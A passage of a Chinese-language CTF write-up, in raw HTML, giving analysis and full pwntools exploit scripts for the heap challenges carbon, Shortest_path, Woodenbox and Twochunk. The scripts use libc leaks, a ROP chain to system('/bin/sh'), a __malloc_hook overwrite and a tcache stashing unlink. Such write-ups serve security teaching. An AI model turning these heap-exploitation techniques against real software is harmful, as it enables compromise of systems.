class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># encoding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./carbon&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x401090&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;, 0)</span></span><br><span class="line"><span class="string">    libc = ELF(&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    one_gadget = 0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def add(length, content, choice=&quot;n&quot;):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;size? &gt;&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;a believer? &gt;&quot;, choice)</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;new sleeve &gt;&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def delete(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def edit(index, content):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;3&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string">    p.send(content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def show(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;4&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def shut():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;5&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x1, &#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x292e61</span></span><br><span class="line">mmap_address = libc.address + <span class="number">0x290000</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)#<span class="number">3</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)#<span class="number">5</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)#<span class="number">6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x70</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x40</span>)+ p64(mmap_address+<span class="number">8</span>)[:<span class="number">6</span>]+b<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;Y&#x27;</span>)# <span class="number">1</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>) # <span class="number">3</span></span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0x602034</span>) + p64(<span class="number">0x30</span>) + p64(libc.sym[<span class="string">&#x27;__environ&#x27;</span>])+b<span class="string">&quot;\n&quot;</span>) #<span class="number">5</span></span><br><span class="line">edit(<span class="number">1</span>, p32(<span class="number">0</span>)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">stack_address = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=True).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.format(hex(stack_address)))</span><br><span class="line"></span><br><span class="line">ret_address = stack_address - <span class="number">0x70</span></span><br><span class="line">edit(<span class="number">5</span>, p64(<span class="number">0x602034</span>) + p64(<span class="number">0x80</span>) + p64(ret_address) + b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc.address + <span class="number">0x14862</span></span><br><span class="line">get_shell = flat([</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    libc.search(b<span class="string">&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">])</span><br><span class="line">edit(<span class="number">2</span>, get_shell+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Shortest-path"><a href="#Shortest-path" class="headerlink" title="Shortest_path"></a>Shortest_path</h2><p><code>flag</code>被加载到了两个位置，一个是全局变量处，一个是<code>top chunk</code>的堆地址处</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810180954.png" alt="图片无法显示，请联系作者" title=" ">

<p>持续不断地分配<code>chunk</code>，使得<code>flag</code>落到<code>name</code>字段的位置就可以输出<code>flag</code>了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Shortest_path&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x401475&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, price, length, name, connected=<span class="number">0</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;options ---&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station ID: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Price: &quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Name Length: &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Name: \n&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;connected station: &quot;</span>, <span class="built_in">str</span>(connected))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qurey_station</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;options ---&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station ID: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ac2240 - ac2000  0x240</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xf</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">qurey_station(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Woodenbox"><a href="#Woodenbox" class="headerlink" title="Woodenbox"></a>Woodenbox</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>程序存在明显的堆溢出漏洞，并且退出时执行的是<code>double free</code>，这很明显是要写入<code>one_gadget</code>。需要注意的是程序没有输出，而且每次删除堆块之后链表都会向前移动一位，即<code>buf_list[0]</code>会消失。</p>
<h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><ul>
<li><p>首先申请一个较大的<code>unsorted bin</code>并释放使得堆块中残留有<code>mainarena+88</code>的地址，依次使用两个<code>fastbin</code>堆块申请，那么最后一个申请的<code>fastbin</code>中就会存在<code>mainarena+88</code>的地址数据，我们将其低两位覆写为<code>stderr+157</code>地址的低两位<code>\x65\xdd</code>，（这里需要爆破<code>16bit</code>）</p>
</li>
<li><p>此时我们申请<code>fastbin</code>堆块并释放，利用堆溢出将<code>fastbin-&gt;fd</code>指针的低<code>1</code>字节改写为保存有<code>stderr+157</code>地址的<code>fasbin</code>堆块地址形成下列结构</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810222806.png" alt="图片无法显示，请联系作者" title=" ">

<p>那么此时我们连续申请三个<code>fastbin</code>堆块，就可以将<code>stderr+157</code>处伪造的堆块申请到，进而可以控制<code>stdout</code>结构体</p>
</li>
<li><p>修改<code>stdout</code>结构体的<code>flag</code>和<code>io_wite_base</code>泄露<code>stdout</code>结构体附近地址，得到<code>libc</code>基址</p>
</li>
<li><p>再次利用<code>fastbin attack</code>将<code>malloc_hook</code>改写为<code>one_gadget</code>地址，<code>getshell</code></p>
</li>
</ul>
<h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># encoding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./woodenbox2&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x555555555041&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xcb7c5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;, 0)</span></span><br><span class="line"><span class="string">    libc = ELF(&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    one_gadget = 0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def add(length, content=&quot;12&quot;):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;length of item name:&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;name of item:&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def change(index, length, content):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the index of item:&quot;, str(index))</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the length of item name:&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;new name of the item:&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def remove(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the index of item:&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def double_free():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x60)  # 0</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x90)</span></span><br><span class="line"><span class="string">add(0x60)  # 4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">remove(2)</span></span><br><span class="line"><span class="string">add(0x20)  # 1</span></span><br><span class="line"><span class="string">add(0x60, &quot;\xdd\x65&quot;)  # 4</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">remove(4)</span></span><br><span class="line"><span class="string">remove(4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">change(0, 0x300, cyclic(0x68) + p64(0x71) + cyclic(0x68) + p64(0x71) + b&quot;\x10&quot;)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60, b&quot;\x00&quot; * 3 + p64(0) * 0x6 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + b&quot;\x00&quot;)</span></span><br><span class="line"><span class="string">p.recv(0x40)</span></span><br><span class="line"><span class="string">libc.address = u64(p.recv(6).ljust(8, b&quot;\x00&quot;)) + 0x20 - libc.sym[&#x27;</span>_IO_2_1_stdout_<span class="number">&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">2</span>, <span class="number">0x10</span>, p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;\x00&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget + libc.address))</span><br><span class="line">double_free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Twochunk"><a href="#Twochunk" class="headerlink" title="Twochunk"></a>Twochunk</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>首先我们先分析一下程序，首先在<code>0x23333000</code>地址处<code>mmap</code>了一块内存的地址，并提供了七种操作。</p>
<p><code>add</code>函数中，根据用户的输入分配相应大小的内存，但是我们最多可以保存分配得到的两个堆块指针，若用户输入的大小为<code>23333</code>则调用<code>malloc</code>分配固定的<code>0xe9</code>大小，否则调用<code>calloc</code>分配用户申请的大小。</p>
<p><code>edit</code>函数中，我们注意到其可以进行<code>0x20</code>字节大小的溢出，并且如果用户输入的是<code>23333</code>则可以进行大范围的堆溢出。</p>
<p>有一次<code>malloc(0x88)</code>的机会，能够对<code>mmap_address</code>中指定的地址进行函数调用</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200812135039.png" alt="图片无法显示，请联系作者" title=" ">



<h3 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h3><p>只要我们可以将<code>mmap_address</code>处改写为<code>system</code>地址，<code>mmap_address+0x30</code>处改写为<code>/bin/sh\x00</code>的地址就可以<code>getshell</code>。但是<code>mmap_address</code>处的内容是程序一开始就需要输入的，因此我们需要将<code>chunk</code>分配到<code>mmap_address</code>处。这就需要利用<code>Tcache Stashing Unlink</code>。</p>
<ul>
<li><p>在<code>small bin</code>中构造两个<code>0x90</code>大小的<code>chunk</code>。构造两个<code>small bin chunk</code>可以首先构造两个相对较大的<code>unsorted bin</code>，之后经过两次分配，分割剩余的<code>0x90</code>进入<code>small bin</code>中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0xe9</span>) <span class="comment"># 进行溢出的chunk</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x130</span>)<span class="comment"># unsorted bin 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>)<span class="comment"># padding to tcache</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x130</span>)<span class="comment"># unsorted bin 2</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 0x140 chunk 1 to small bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x140</span>)<span class="comment"># padding to tcache</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xe9</span>)<span class="comment"># 0x40 chunk 1 to unsorted bin，对small bin中的chunk进行换序</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x140 chunk2 to unsorted bin: 0x140chunk2&lt;--&gt;0x40</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment"># merge 0x40, 0x100 chunk to 0x140 chunk 1, put to unsorted bin: 0x140chunk1&lt;--&gt;0x140 chunk2</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xa8</span>)<span class="comment"># 0x140 chunk1 to small bin, 0x90 chunk2 in unsorted bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xa8</span>)<span class="comment"># 0x90 chunk2 to small bin, 0x90 chunk1 in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment"># clear pointer buf</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x150</span>)<span class="comment"># small bin: 0x90chunk1&lt;--&gt;0x90chunk2</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>malloc</code>申请一块<code>0x100</code>的<code>tcache</code>，此时可以泄露堆地址</p>
</li>
<li><p>覆写<code>chunk1</code>的<code>bk</code>指针为<code>mmap_address-0x10</code>，<code>calloc(0x88)</code>即可将<code>mmap_address</code>加入<code>tcache</code>，此时可以泄露<code>libc</code>基址</p>
</li>
<li><p>调用<code>leave_end_message</code>使用<code>malloc(0x88)</code>即可以分配到<code>mmap_address</code>，布局<code>system</code>函数和参数，<code>getshell</code></p>
</li>
</ul>
<h4 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./twochunk&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.30/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 